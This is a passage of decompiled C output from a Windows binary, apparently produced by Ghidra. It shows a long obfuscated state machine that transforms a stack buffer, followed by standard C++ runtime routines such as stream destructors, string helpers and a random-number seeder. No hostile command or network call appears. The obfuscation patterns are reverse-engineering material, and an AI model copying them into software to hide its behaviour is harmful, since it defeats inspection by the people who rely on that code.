          if (uVar7 + 0x97 < uVar16) {
            bVar13 = cVar15 + (cVar15 + 0xbeU & bVar2) * -2 + -0x74 + bVar2;
            uVar7 = uVar7 + 0x97;
            goto LAB_140018e03;
          }
          if (uVar7 + 0x116 < uVar16) {
            cVar14 = ('(' - (cVar15 + 0x48U & bVar2)) * '\x02' + cVar15;
            uVar7 = uVar6;
            goto LAB_1400196c0;
          }
          if (uVar16 <= uVar7 + 0x110) {
            uVar11 = uVar7 + 0xc0;
            uVar6 = uVar7 + 0xc3;
          }
        }
      }
      bVar13 = ('\x1b' - (cVar15 - 9U & bVar2)) * '\x02' + cVar15 + bVar2;
      uVar7 = uVar6;
    }
    if (uVar7 + 0x80 <= uVar11) {
      if (uVar11 == uVar7 + 1) {
        bVar13 = ('\n' - (cVar15 + 0x52U & bVar2)) * '\x02' + cVar15 + bVar2;
        uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar7 + 1;
      }
      else {
        if (uVar11 == uVar7 + 3) {
          bVar13 = ('\x12' - (cVar15 + 0x7aU & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar11 = uVar11 + uVar7;
          goto LAB_1400196fd;
        }
        if (uVar11 == uVar7 + 4) {
          cVar14 = cVar15 + (cVar15 + 4U & bVar2) * -2 + -0x18;
LAB_14001962e:
          bVar13 = cVar14 + bVar2;
          local_1720[uVar12 - 0x28] =
               (cVar15 - 0x33U) + (cVar15 - 0x33U & bVar2) * -2 + 'e' + bVar2 + bVar13;
          uVar11 = uVar11 + uVar7;
          goto LAB_1400196fd;
        }
        if (uVar11 != uVar7 + 8) goto LAB_140019291;
        cVar14 = ('\x1a' - (cVar15 + 0xa2U & bVar2)) * '\x02' + cVar15;
LAB_1400196c0:
        bVar13 = cVar14 + bVar2;
LAB_1400196c3:
        local_1720[uVar12 - 0x28] = cVar15 + 0x43U + (cVar15 + 0x43U & bVar2) * -2 + '+' + bVar2;
        uVar7 = uVar7 + 1;
      }
      goto LAB_140018e03;
    }
    cVar14 = ('1' - (cVar15 - 0x3bU & bVar2)) * '\x02' + cVar15;
LAB_14001928e:
    bVar13 = cVar14 + bVar2;
LAB_140019291:
    if (uVar7 + uVar11 == 0x80) {
      bVar13 = cVar15 + (cVar15 + 0x92U & bVar2) * -2 + 0x94;
LAB_14001972b:
      bVar9 = cVar15 + 0x57U + (cVar15 + 0x57U & bVar2) * -2 + -0x61 + bVar2;
      local_1720[uVar12 - 0x28] = bVar9;
      uVar12 = uVar12 - ((ulonglong)bVar9 + uVar7 + 1);
      uVar7 = uVar7 + 1;
LAB_14001974e:
      bVar9 = (char)uVar12 + 0x1c;
      local_1720[uVar12 - 0x28] = ('\x1e' - (bVar2 & bVar9)) * '\x02' + bVar2 + bVar9;
      lVar17 = uVar12 + (-1 - (uVar11 + 1));
      uVar12 = lVar17 + (byte)local_1720[lVar17 + -0x28] + uVar7 + 1;
      uVar11 = uVar11 + 1;
      goto LAB_140018e03;
    }
    if (uVar11 <= uVar7 + 0x400) {
      if (uVar11 == uVar7 + 1) {
        cVar14 = ('\x0f' - (cVar15 + 0x7bU & bVar2)) * '\x02' + cVar15;
        goto LAB_1400196c0;
      }
      if (uVar11 == uVar7 + 2) {
        bVar13 = cVar15 + (cVar15 + 0x8fU & bVar2) * -2 + -0x5a + bVar2;
      }
      else {
        if (uVar11 == uVar7 + 3) {
          cVar14 = ('5' - (cVar15 + 0x19U & bVar2)) * '\x02';
          goto LAB_14001962b;
        }
        if (uVar11 == uVar7 + 5) {
          bVar13 = ('\x17' - (cVar15 + 0xa3U & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar11 = uVar11 + uVar7;
        }
        else {
          if (uVar11 != uVar7 + 6) goto LAB_14001924e;
          bVar13 = cVar15 + (cVar15 + 0x2dU & bVar2) * -2 + -0xe + bVar2;
        }
LAB_1400196fd:
        uVar12 = uVar12 - bVar13;
      }
      goto LAB_140018e03;
    }
    cVar14 = ('-' - (cVar15 - 0xfU & bVar2)) * '\x02' + cVar15;
LAB_14001924b:
    bVar13 = cVar14 + bVar2;
LAB_14001924e:
    if (5 < uVar11) {
      cVar14 = bVar2 + (cVar15 + 8U & bVar2) * -2 + -0x30;
LAB_14001962b:
      cVar14 = cVar14 + cVar15;
      goto LAB_14001962e;
    }
    if (uVar7 + 10 < uVar11) {
      cVar14 = ('2' - (cVar15 + 0x1aU & bVar2)) * '\x02' + cVar15;
LAB_140019212:
      bVar13 = cVar14 + bVar2;
    }
    else {
      if (uVar11 == uVar7 + 1) {
        bVar13 = ('\x14' - (cVar15 + 0xa4U & bVar2)) * '\x02' + cVar15 + bVar2;
        uVar12 = uVar12 + (byte)local_1720[uVar12 - 0x28] + uVar7 + 1;
        goto LAB_140018e03;
      }
      if (uVar11 == uVar7 + 2) {
        bVar13 = cVar15 + (cVar15 + 0x2eU & bVar2) * -2 + -0x14 + bVar2;
        goto LAB_14001974e;
      }
      if (uVar11 == uVar7 + 3) {
        bVar13 = cVar15 + (cVar15 + 0xb8U & bVar2) * -2 + -0x50 + bVar2;
        goto LAB_14001972b;
      }
      if (uVar11 == uVar7 + 5) {
        cVar14 = cVar15 + (cVar15 + 0x56U & bVar2) * -2 + -4;
        goto LAB_14001962e;
      }
      if (uVar11 == uVar7 + 7) {
        cVar14 = ('$' - (cVar15 - 0xcU & bVar2)) * '\x02' + cVar15;
        goto LAB_1400196c0;
      }
    }
    if (0x27 < uVar7) {
      bVar13 = (('\x06' - (cVar15 + 0x7eU & bVar2)) * '\x02' + cVar15 + bVar2) * '\x02';
      goto LAB_1400196c3;
    }
LAB_1400191f2:
    local_1720[uVar12 - 0x28] = bVar13;
    uVar12 = uVar12 + 1;
    goto LAB_140018e03;
  }
  bVar2 = local_1720[uVar16 - 0x28];
LAB_1400182c3:
  if (uVar16 < uVar7) {
    puVar10 = (undefined4 *)(auStack_1788 + 0xcf49fb);
    goto LAB_140018d5e;
  }
  cVar15 = (char)uVar16;
  if (uVar12 + 1 <= uVar7) {
    if (uVar7 == uVar12 + 1) {
      bVar13 = bVar2 + cVar15 + 0x15U + (cVar15 + 0x15U & bVar2) * -2 + 0x6d;
      uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar12 + 1;
    }
    else {
      if (uVar7 == uVar12 + 2) {
        bVar13 = bVar2 + cVar15 + 0x23U + (cVar15 + 0x23U & bVar2) * -2 + 0xb;
        goto LAB_140018ca9;
      }
      if (uVar7 == uVar12 + 3) {
        bVar13 = bVar2 + cVar15 + 0x31U + (cVar15 + 0x31U & bVar2) * -2 + 0xa9;
        goto LAB_140018c6a;
      }
      if (uVar7 != uVar12 + 6) {
        if (uVar7 != uVar12 + 8) goto LAB_140018326;
        cVar14 = cVar15 + (cVar15 + 0x85U & bVar2) * -2 + -0x1e;
        goto LAB_140018c0c;
      }
      bVar13 = cVar15 + (cVar15 + 0x69U & bVar2) * -2 + -0x76 + bVar2;
    }
    goto LAB_1400182b3;
  }
  bVar13 = cVar15 + 7U + (cVar15 + 7U & bVar2) * -2 + -0x31 + bVar2;
LAB_140018326:
  if (uVar16 < uVar12) {
    puVar10 = (undefined4 *)(auStack_1788 + 0x16b50f4);
    goto LAB_140018d5e;
  }
  if (uVar12 + 4 <= uVar7) {
    if (uVar7 != uVar12 + 1) {
      if (uVar7 != uVar12 + 2) {
        if (uVar7 != uVar12 + 5) goto LAB_140018380;
        cVar15 = cVar15 + (cVar15 - 0x19U & bVar2) * -2 + -0x6a;
        goto LAB_140018ba6;
      }
      bVar13 = cVar15 + (cVar15 + 0xbdU & bVar2) * -2 + -0x6e + bVar2;
      goto LAB_1400182b3;
    }
    cVar14 = ('\x1d' - (cVar15 + 0xa1U & bVar2)) * '\x02' + cVar15;
    goto LAB_140018c0c;
  }
  bVar13 = cVar15 + (cVar15 + 0x93U & bVar2) * -2 + -0x72 + bVar2;
LAB_140018380:
  while (uVar11 = uVar12, uVar16 < uVar12 + uVar7) {
    while( true ) {
      do {
        uVar12 = uVar11;
        if (uVar7 == uVar12 + 1000) {
          cVar14 = cVar15 + (cVar15 + 2U & bVar2) * -2 + -0xc;
          goto LAB_140018c0c;
        }
        uVar6 = uVar12 + 0x200;
        if (uVar7 == uVar6) {
          bVar13 = cVar15 + (cVar15 + 0x10U & bVar2) * -2 + -0x60 + bVar2;
          uVar12 = uVar12 + 1;
          goto LAB_1400182b3;
        }
        if (uVar7 == uVar12 + 0x2a) {
          bVar13 = ('&' - (cVar15 + 0x1eU & bVar2)) * '\x02' + cVar15 + bVar2;
          goto LAB_1400182b3;
        }
        if (uVar7 == uVar12 + 9) {
          cVar14 = cVar15 + (cVar15 + 0x2cU & bVar2) * -2 + -8;
          goto LAB_140018b59;
        }
        if (uVar7 == uVar12 + 8) {
          bVar13 = cVar15 + (cVar15 + 0x3aU & bVar2) * -2 + -0x5c + bVar2;
          uVar7 = uVar7 + uVar12;
          goto LAB_140018ba9;
        }
        if (uVar7 == uVar12 + 100) {
          cVar15 = ('(' - (cVar15 + 0x48U & bVar2)) * '\x02' + cVar15;
          goto LAB_140018ba6;
        }
        if (uVar7 == uVar12 + 0x41) {
          bVar13 = cVar15 + (cVar15 + 0x56U & bVar2) * -2 + -4 + bVar2;
          goto LAB_140018c6a;
        }
        if (uVar7 == uVar12 + 6) {
          bVar13 = cVar15 + (cVar15 + 100U & bVar2) * -2 + -0x58 + bVar2;
          goto LAB_140018ca9;
        }
        if (uVar7 == uVar12 + 5) {
          bVar13 = ('*' - (cVar15 + 0x72U & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar12 + 1;
          goto LAB_1400182b3;
        }
        uVar11 = uVar12;
      } while (uVar7 == uVar12 + 0x40);
      uVar11 = uVar12 + 0x261;
      if (uVar6 < uVar12 + 0x28b) {
        bVar13 = bVar2 + cVar15 + (cVar15 + 0x95U & bVar2) * -2 + 0x82;
        goto LAB_1400182a3;
      }
      uVar1 = uVar12 + 699;
      if (uVar6 < uVar1) {
        bVar13 = ('\x17' - (cVar15 + 0xa3U & bVar2)) * '\x02' + cVar15 + bVar2;
        goto LAB_1400182b0;
      }
      uVar7 = uVar6;
      if (uVar6 < uVar12 + 0x269) {
        bVar13 = cVar15 + (cVar15 + 0xb1U & bVar2) * -2 + -0x26 + bVar2;
        uVar12 = uVar11;
        goto LAB_1400182c3;
      }
      if (uVar6 < uVar12 + 0x2c5) {
        bVar13 = cVar15 + (cVar15 + 0xbfU & bVar2) * -2 + -0x7a + bVar2;
        uVar12 = uVar11;
        goto LAB_140018326;
      }
      if (uVar6 < uVar12 + 0x2a3) break;
      if (uVar6 < uVar12 + 0x2db) {
        cVar14 = cVar15 + (cVar15 - 0x25U & bVar2) * -2 + -0x22;
        uVar12 = uVar11;
        goto LAB_140018750;
      }
      if (uVar6 < uVar12 + 0x266) {
        cVar14 = cVar15 + (cVar15 - 0x17U & bVar2) * -2 + -0x76;
        uVar12 = uVar11;
        goto LAB_14001870b;
      }
      if (uVar6 < uVar12 + 0x265) {
        cVar14 = ('\x1b' - (cVar15 - 9U & bVar2)) * '\x02' + cVar15;
        uVar12 = uVar11;
        goto LAB_1400186cf;
      }
      if (uVar6 < uVar12 + 0x289) {
        bVar13 = cVar15 + (cVar15 + 5U & bVar2) * -2 + -0x1e + bVar2;
        uVar12 = uVar11;
        goto LAB_1400186ae;
      }
      if (uVar12 + 0x1261 <= uVar6) {
        uVar11 = uVar12 + 0x2be;
        uVar7 = uVar1;
        if (uVar12 + 0x2ff < uVar1) {
          bVar13 = ('\b' - (cVar15 + 0x28U & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar11 + 1;
          uVar12 = uVar11;
          goto LAB_1400182b3;
        }
        if (uVar12 + 0x2c4 < uVar1) {
          bVar13 = cVar15 + (cVar15 + 0x36U & bVar2) * -2 + -0x44 + bVar2;
          uVar12 = uVar11;
          goto LAB_140018ca9;
        }
        if (uVar12 + 0x300 < uVar1) {
          bVar13 = ('4' - (cVar15 + 0x44U & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar12 = uVar11;
          goto LAB_140018c6a;
        }
        if (uVar12 + 0x338 < uVar1) {
          cVar15 = ('\n' - (cVar15 + 0x52U & bVar2)) * '\x02' + cVar15;
          uVar12 = uVar11;
          goto LAB_140018ba6;
        }
        if (uVar12 + 799 < uVar1) {
          bVar13 = cVar15 + (cVar15 + 0x60U & bVar2) * -2 + -0x40 + bVar2;
          uVar7 = uVar1 + uVar11;
          uVar12 = uVar11;
          goto LAB_140018ba9;
        }
        if (uVar12 + 0x2c2 < uVar1) {
          cVar14 = ('6' - (cVar15 + 0x6eU & bVar2)) * '\x02';
          uVar12 = uVar11;
          goto LAB_140018b56;
        }
        if (uVar12 + 0x2e6 < uVar1) {
          bVar13 = ('\f' - (cVar15 + 0x7cU & bVar2)) * '\x02' + cVar15 + bVar2;
          uVar12 = uVar11;
          goto LAB_1400182b3;
        }
        if (uVar12 + 0x2de < uVar1) {
          bVar13 = cVar15 + (cVar15 + 0x8aU & bVar2) * -2 + -0x3c + bVar2;
          uVar12 = uVar12 + 0x2bf;
          goto LAB_1400182b3;
        }
        if (uVar12 + 0x6be < uVar1) {
          cVar14 = ('8' - (cVar15 + 0x98U & bVar2)) * '\x02' + cVar15;
          uVar12 = uVar11;
          goto LAB_140018c0c;
        }
        if (uVar1 <= uVar12 + 0x2c0) {
          uVar7 = uVar12 + 0x2c4;
          uVar11 = uVar12 + 0x2d4;
        }
      }
    }
    bVar13 = ('\x19' - (cVar15 - 0x33U & bVar2)) * '\x02' + cVar15 + bVar2;
    uVar12 = uVar11;
  }
  if (uVar7 < uVar12 + 8) {
    cVar14 = cVar15 + (cVar15 + 7U & bVar2) * -2 + -0x2a;
LAB_140018750:
    bVar13 = cVar14 + bVar2;
LAB_140018753:
    if (uVar12 + uVar7 != 6) {
      if (uVar12 + 0x10 < uVar7) {
        cVar14 = cVar15 + (cVar15 + 0xabU & bVar2) * -2 + -2;
LAB_14001870b:
        bVar13 = cVar14 + bVar2;
LAB_14001870e:
        if (0x3f < uVar7) {
          cVar14 = bVar2 + (cVar15 - 0x28U & bVar2) * -2 + -0x10;
          goto LAB_140018b56;
        }
        if (uVar12 + 0x200 < uVar7) {
          cVar14 = cVar15 + (cVar15 + 0x3eU & bVar2) * -2 + -0x74;
LAB_1400186cf:
          bVar13 = cVar14 + bVar2;
        }
        else {
          if (uVar7 == uVar12 + 1) {
            bVar13 = ('\x1c' - (cVar15 + 0x4cU & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar12 + 1;
            goto LAB_1400182b3;
          }
          if (uVar7 == uVar12 + 3) {
            bVar13 = cVar15 + (cVar15 + 0x68U & bVar2) * -2 + -0x70 + bVar2;
            goto LAB_140018c6a;
          }
          if (uVar7 == uVar12 + 2) {
            bVar13 = cVar15 + (cVar15 + 0x84U & bVar2) * -2 + -0x18 + bVar2;
            uVar7 = uVar7 + uVar12;
            goto LAB_140018ba9;
          }
          if (uVar7 == uVar12 + 6) {
            bVar13 = (' ' - (cVar15 + 0xa0U & bVar2)) * '\x02' + cVar15 + bVar2;
            goto LAB_1400182b3;
          }
          if (uVar7 == uVar12 + 5) {
            bVar13 = cVar15 + (cVar15 + 0xaeU & bVar2) * -2 + -0x14 + bVar2;
            uVar12 = uVar12 + 1;
            goto LAB_1400182b3;
          }
        }
        if (uVar12 < 0x1000) {
LAB_1400186ae:
          local_1720[uVar16 - 0x28] = bVar13;
          uVar16 = uVar16 + 1;
          goto LAB_1400182b3;
        }
        bVar13 = (cVar15 + (cVar15 - 0x36U & bVar2) * -2 + bVar2) * '\x02' + 0x88;
      }
      else {
        if (uVar7 != uVar12 + 1) {
          if (uVar7 == uVar12 + 2) {
            cVar14 = cVar15 + (cVar15 - 0x1dU & bVar2) * -2 + -0x52;
            goto LAB_140018b59;
          }
          if (uVar7 == uVar12 + 4) {
            bVar13 = ('-' - (cVar15 - 0xfU & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar7 = uVar7 + uVar12;
            goto LAB_140018ba9;
          }
          if (uVar7 != uVar12 + 5) {
            if (uVar7 == uVar12 + 3) {
              bVar13 = cVar15 + (cVar15 + 0xdU & bVar2) * -2 + -0x4e + bVar2;
              goto LAB_140018c6a;
            }
            if (uVar7 != uVar12 + 6) goto LAB_14001870e;
            bVar13 = ('\x05' - (cVar15 + 0x29U & bVar2)) * '\x02' + cVar15 + bVar2;
            uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar12 + 1;
            goto LAB_1400182b3;
          }
          cVar15 = ('\x03' - (cVar15 - 1U & bVar2)) * '\x02' + cVar15;
LAB_140018ba6:
          bVar13 = cVar15 + bVar2;
          goto LAB_140018ba9;
        }
        cVar14 = cVar15 + (cVar15 + 0xb9U & bVar2) * -2 + -0x56;
LAB_140018c0c:
        bVar13 = cVar14 + bVar2;
      }
      local_1720[uVar16 - 0x28] = bVar2 + (bVar2 & cVar15 - 0x2fU) * -2 + 'I' + (cVar15 - 0x2fU);
      uVar12 = uVar12 + 1;
      goto LAB_1400182b3;
    }
    bVar13 = cVar15 + (cVar15 - 0x1aU & bVar2) * -2 + 0x9c;
  }
  else {
    if (uVar7 == uVar12 + 1) {
      bVar13 = ('\x0e' - (cVar15 + 0x26U & bVar2)) * '\x02' + cVar15 + bVar2;
      uVar16 = uVar16 + (byte)local_1720[uVar16 - 0x28] + uVar12 + 1;
      goto LAB_1400182b3;
    }
    if (uVar7 != uVar12 + 2) {
      if (uVar7 == uVar12 + 3) {
        bVar13 = cVar15 + (cVar15 + 0x5eU & bVar2) * -2 + -0x34 + bVar2;
        uVar7 = uVar7 + uVar12;
        goto LAB_140018ba9;
      }
      if (uVar7 != uVar12 + 4) {
        if (uVar7 != uVar12 + 5) goto LAB_140018753;
        bVar13 = cVar15 + (cVar15 + 0x88U & bVar2) * -2 + -0x30 + bVar2;
        uVar12 = uVar12 + 1;
        goto LAB_1400182b3;
      }
      cVar14 = ('<' - (cVar15 + 0x6cU & bVar2)) * '\x02';
LAB_140018b56:
      cVar14 = cVar14 + cVar15;
LAB_140018b59:
      bVar13 = cVar14 + bVar2;
      local_1720[uVar16 - 0x28] =
           bVar2 + (bVar2 & cVar15 - 0x21U) * -2 + -0x19 + (cVar15 - 0x21U) + bVar13;
      uVar7 = uVar7 + uVar12;
LAB_140018ba9:
      uVar16 = uVar16 - bVar13;
      goto LAB_1400182b3;
    }
    bVar13 = (':' - (cVar15 + 0x42U & bVar2)) * '\x02' + cVar15 + bVar2;
  }
LAB_140018c6a:
  bVar9 = bVar2 + (bVar2 & cVar15 - 0x13U) * -2 + -0x7b + (cVar15 - 0x13U);
  local_1720[uVar16 - 0x28] = bVar9;
  uVar16 = uVar16 - ((ulonglong)bVar9 + uVar12 + 1);
  uVar12 = uVar12 + 1;
LAB_140018ca9:
  bVar9 = (char)uVar16 - 0xc;
  local_1720[uVar16 - 0x28] = ('*' - (bVar2 & bVar9)) * '\x02' + bVar2 + bVar9;
  lVar17 = uVar16 + (-1 - (uVar7 + 1));
  uVar16 = lVar17 + (byte)local_1720[lVar17 + -0x28] + uVar12 + 1;
  uVar7 = uVar7 + 1;
  goto LAB_1400182b3;
}



/* ==================================================================== */
/* FUN_140019960 @ 140019960 */

void FUN_140019960(longlong *param_1)

{
  basic_ios<char,std::char_traits<char>_> *this;

  this = (basic_ios<char,std::char_traits<char>_> *)(param_1 + 0x11);
  *(undefined ***)(this + (longlong)*(int *)(*param_1 + 4) + -0x88) = &PTR_LAB_1400570c0;
  *(int *)(this + (longlong)*(int *)(*param_1 + 4) + -0x8c) = *(int *)(*param_1 + 4) + -0x88;
  FUN_140024a90(param_1 + 1);
  std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
            ((basic_ostream<char,std::char_traits<char>_> *)(param_1 + 2));
                    /* WARNING: Could not recover jumptable at 0x0001400199b4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>(this);
  return;
}



/* ==================================================================== */
/* FUN_1400199c0 @ 1400199c0 */

void FUN_1400199c0(longlong *param_1)

{
  basic_ios<char,std::char_traits<char>_> *this;

  this = (basic_ios<char,std::char_traits<char>_> *)(param_1 + 0x15);
  *(undefined ***)(this + (longlong)*(int *)(*param_1 + 4) + -0xa8) = &PTR_LAB_1400571a0;
  *(int *)(this + (longlong)*(int *)(*param_1 + 4) + -0xac) = *(int *)(*param_1 + 4) + -0xa8;
  FUN_1400243b0(param_1 + 1);
  std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
            ((basic_ostream<char,std::char_traits<char>_> *)(param_1 + 2));
                    /* WARNING: Could not recover jumptable at 0x000140019a17. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_ios<char,std::char_traits<char>_>::~basic_ios<char,std::char_traits<char>_>(this);
  return;
}



/* ==================================================================== */
/* FUN_140019a20 @ 140019a20 */
/* DECOMPILE FAILED: Exception while decompiling 140019a20: process: timeout
 */

/* ==================================================================== */
/* thunk_FUN_140025000 @ 140022ce0 */

void thunk_FUN_140025000(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  if (0xf < (ulonglong)param_1[3]) {
    pvVar1 = (void *)*param_1;
    _Memory = pvVar1;
    if ((0xfff < param_1[3] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_140022cf0 @ 140022cf0 */

undefined8 * FUN_140022cf0(undefined8 *param_1,undefined4 param_2,undefined8 *param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  ulonglong uVar5;
  ulonglong _Size;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  uVar3 = param_3[1];
  if (uVar3 != 0) {
    if (0x7fffffff < uVar3) {
                    /* WARNING: Subroutine does not return */
      FUN_14000ed00();
    }
    uVar3 = FUN_140051054(param_2,*param_3,uVar3,0,0);
    if ((int)(uVar3 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000efe0(uVar3 >> 0x20);
    }
    uVar1 = param_1[2];
    uVar5 = (ulonglong)(int)uVar3;
    if (uVar1 < uVar5) {
      _Size = uVar5 - uVar1;
      uVar2 = param_1[3];
      if (uVar2 - uVar1 < _Size) {
        FUN_1400257f0(param_1,_Size,uVar2,_Size);
      }
      else {
        param_1[2] = uVar5;
        puVar4 = param_1;
        if (0xf < uVar2) {
          puVar4 = (undefined8 *)*param_1;
        }
        memset((void *)((longlong)puVar4 + uVar1),0,_Size);
        *(undefined1 *)((longlong)((longlong)puVar4 + uVar1) + _Size) = 0;
      }
    }
    else {
      param_1[2] = uVar5;
      puVar4 = param_1;
      if (0xf < (ulonglong)param_1[3]) {
        puVar4 = (undefined8 *)*param_1;
      }
      *(undefined1 *)(uVar5 + (longlong)puVar4) = 0;
    }
    puVar4 = param_1;
    if (0xf < (ulonglong)param_1[3]) {
      puVar4 = (undefined8 *)*param_1;
    }
    uVar3 = FUN_140051054(param_2,*param_3,*(undefined4 *)(param_3 + 1),puVar4,(int)uVar3);
    if ((int)(uVar3 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000efe0(uVar3 >> 0x20);
    }
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140022e50 @ 140022e50 */

basic_ostream<char,std::char_traits<char>_> *
FUN_140022e50(basic_ostream<char,std::char_traits<char>_> *param_1,char *param_2)

{
  basic_ostream<char,std::char_traits<char>_> *this;
  bool bVar1;
  int iVar2;
  int iVar3;
  __int64 _Var4;
  longlong lVar5;
  longlong lVar6;
  longlong lVar7;

  iVar3 = 0;
  lVar7 = -1;
  do {
    lVar7 = lVar7 + 1;
  } while (param_2[lVar7] != '\0');
  lVar6 = *(longlong *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x28);
  if ((lVar6 < 1) || (lVar6 <= lVar7)) {
    lVar6 = 0;
  }
  else {
    lVar6 = lVar6 - lVar7;
  }
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) + 8)
    )();
  }
  bVar1 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
  if (bVar1) {
    this = *(basic_ostream<char,std::char_traits<char>_> **)
            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x50);
    if ((this == (basic_ostream<char,std::char_traits<char>_> *)0x0) || (this == param_1)) {
      bVar1 = true;
    }
    else {
      std::basic_ostream<char,std::char_traits<char>_>::flush(this);
      bVar1 = std::ios_base::good((ios_base *)(param_1 + *(int *)(*(longlong *)param_1 + 4)));
    }
  }
  else {
    bVar1 = false;
  }
  if (bVar1 == false) {
    iVar3 = 4;
  }
  else {
    lVar5 = *(longlong *)param_1;
    if ((*(uint *)(param_1 + (longlong)*(int *)(lVar5 + 4) + 0x18) & 0x1c0) != 0x40) {
      for (; 0 < lVar6; lVar6 = lVar6 + -1) {
        iVar2 = std::basic_streambuf<char,std::char_traits<char>_>::sputc
                          (*(basic_streambuf<char,std::char_traits<char>_> **)
                            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48),
                           (char)param_1[(longlong)*(int *)(*(longlong *)param_1 + 4) + 0x58]);
        if (iVar2 == -1) goto LAB_140022fa6;
      }
      lVar5 = *(longlong *)param_1;
    }
    _Var4 = std::basic_streambuf<char,std::char_traits<char>_>::sputn
                      (*(basic_streambuf<char,std::char_traits<char>_> **)
                        (param_1 + (longlong)*(int *)(lVar5 + 4) + 0x48),param_2,lVar7);
    if (_Var4 == lVar7) {
      for (; 0 < lVar6; lVar6 = lVar6 + -1) {
        iVar2 = std::basic_streambuf<char,std::char_traits<char>_>::sputc
                          (*(basic_streambuf<char,std::char_traits<char>_> **)
                            (param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48),
                           (char)param_1[(longlong)*(int *)(*(longlong *)param_1 + 4) + 0x58]);
        if (iVar2 == -1) goto LAB_140022fa6;
      }
    }
    else {
LAB_140022fa6:
      iVar3 = 4;
    }
    *(undefined8 *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x28) = 0;
  }
  std::basic_ios<char,std::char_traits<char>_>::setstate
            ((basic_ios<char,std::char_traits<char>_> *)
             (param_1 + *(int *)(*(longlong *)param_1 + 4)),iVar3,false);
  iVar3 = std::uncaught_exceptions();
  if (iVar3 == 0) {
    std::basic_ostream<char,std::char_traits<char>_>::_Osfx(param_1);
  }
  if (*(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) !=
      (longlong *)0x0) {
    (**(code **)(**(longlong **)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + 0x48) +
                0x10))();
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140023030 @ 140023030 */

undefined8 FUN_140023030(undefined8 param_1,undefined8 *param_2)

{
  undefined8 uVar1;
  undefined4 uVar2;
  undefined8 *local_18;
  undefined8 local_10;

  uVar1 = param_2[2];
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  uVar2 = FUN_140050fe4();
  local_18 = param_2;
  local_10 = uVar1;
  FUN_14000f1b0(param_1,uVar2,&local_18);
  return param_1;
}



/* ==================================================================== */
/* FUN_140023090 @ 140023090 */

undefined4 * FUN_140023090(undefined4 *param_1,uint param_2)

{
  ulonglong uVar1;
  uint *puVar2;

  param_1[0x4e1] = 0xffffffff;
  param_1[1] = param_2;
  uVar1 = 1;
  puVar2 = param_1 + 2;
  do {
    param_2 = (param_2 >> 0x1e ^ param_2) * 0x6c078965 + (int)uVar1;
    uVar1 = uVar1 + 1;
    *puVar2 = param_2;
    puVar2 = puVar2 + 1;
  } while (uVar1 < 0x270);
  *param_1 = 0x270;
  return param_1;
}



/* ==================================================================== */
/* FUN_1400230f0 @ 1400230f0 */

undefined8 * FUN_1400230f0(undefined8 *param_1,longlong *param_2)

{
  void *_Dst;
  ulonglong uVar1;
  size_t _Size;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar1 = param_2[1] - *param_2 >> 3;
  if (uVar1 != 0) {
    if (0x1fffffffffffffff < uVar1) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    _Dst = (void *)FUN_14000e6b0(uVar1 * 8);
    *param_1 = _Dst;
    param_1[1] = _Dst;
    param_1[2] = (void *)((longlong)_Dst + uVar1 * 8);
    _Size = param_2[1] - *param_2;
    memmove(_Dst,(void *)*param_2,_Size);
    param_1[1] = (void *)((longlong)_Dst + ((longlong)_Size >> 3) * 8);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140023190 @ 140023190 */

void FUN_140023190(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  if (7 < (ulonglong)param_1[3]) {
    pvVar1 = (void *)*param_1;
    _Memory = pvVar1;
